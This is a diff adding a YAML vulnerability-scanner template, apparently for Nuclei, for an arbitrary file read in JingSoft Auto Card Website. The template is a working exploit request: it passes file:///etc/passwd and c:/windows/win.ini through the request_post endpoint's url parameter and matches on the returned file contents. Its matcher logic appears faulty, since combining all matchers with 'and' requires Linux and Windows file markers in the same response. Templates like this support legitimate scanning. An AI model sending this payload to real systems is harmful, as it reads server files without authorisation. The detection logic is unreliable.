@@ -1,0 +1,40 @@
+id: poc-yaml-jingsoft-request-post-anyfile-read
+info:
+  name: JingSoft Auto Card Website Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    JingSoft Auto Card Website is vulnerable to an arbitrary file read vulnerability via the `request_post` endpoint.
+
+variables:
+  path_list:
+    - "etc/passwd"
+    - "c:/windows/win.ini"
+
+http:
+  - method: GET
+    path:
+      - "/pay/xinhui/request_post?url=file:///{{path}}&post_data[1]=aaa"
+    payloads:
+      path: '{{path_list}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+      - type: word
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+        condition: and
+      - type: word
+        negative: true
+        words:
+          - "<"
+    stop-at-first-match: true
